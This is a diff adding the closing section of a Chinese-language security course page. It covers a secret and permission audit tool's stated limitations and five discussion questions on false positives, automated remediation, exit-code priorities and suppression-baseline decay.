+<li><strong>不解析压缩包/二进制</strong>：压缩包里的凭据、图片马、二进制配置都看不见。</li>
+<li><strong>未评测检出率</strong>：没有在带标签的真实样本集上计算 precision/recall，<br>
+  因此<strong>不能</strong>替代生产审计产品，也不能作为合规结论的依据。</li>
+</ul>
+<h2 id="11">11. 思考题</h2>
+<ol>
+<li>报告里，文档误报（<code>docs/notes.md</code> 的 <code>password = "example-value"</code>）与<br>
+   真实私钥命中看起来同样"严重"。这对"用命中数考核团队"意味着什么？</li>
+<li>如果允许审计工具自动处置（自动改 chmod、自动删密钥），<br>
+   哪一类故障会从"漏报"升级成"生产事故"？</li>
+<li>退出码把"覆盖不全(4)"排在"命中(3)"之前。请举一个<strong>反例场景</strong>，<br>
+   说明在某些组织里这个优先级可能需要调整，以及调整的代价。</li>
+<li>本课 13 条规则全是模式匹配。请列出至少三类它<strong>结构上</strong>看不见的风险，<br>
+   并各给一个"纯模式匹配会产生误判"的具体例子。</li>
+<li><code>baseline</code> 里的抑制项如果长期不复查，会发生什么？<br>
+   请设计一个能让"抑制腐化"暴露出来的机制（提示：报告里加哪些字段、<br>
+   CI 里加哪条检查）。</li>
+</ol>
+  </main>
+</div>
+
+<nav class="pager">
+  <a class="nav-prev" href="../day-158/index.html">← Day 158 WebShell 检测：实战扫描器（静态特征 + 行为关联 + 评分定级）</a><a class="nav-next" href="../day-160/index.html">Day 160 日志安全分析：格式标准化 · 异常登录 · 暴力破解识别 →</a>
+</nav>
+
+<script src="../assets/mermaid.min.js"></script>
+<script>
+if (window.mermaid) {
+  mermaid.initialize({ startOnLoad: true, securityLevel: 'loose', theme: 'default' });
+}
+function copyCode(btn) {
+  var pre = btn.closest('.codeblock').querySelector('pre');
+  navigator.clipboard.writeText(pre.innerText).then(function () {
+    var o = btn.textContent; btn.textContent = '已复制';
+    setTimeout(function () { btn.textContent = o; }, 1500);
+  });
+}
+</script>
+</body>
+</html>
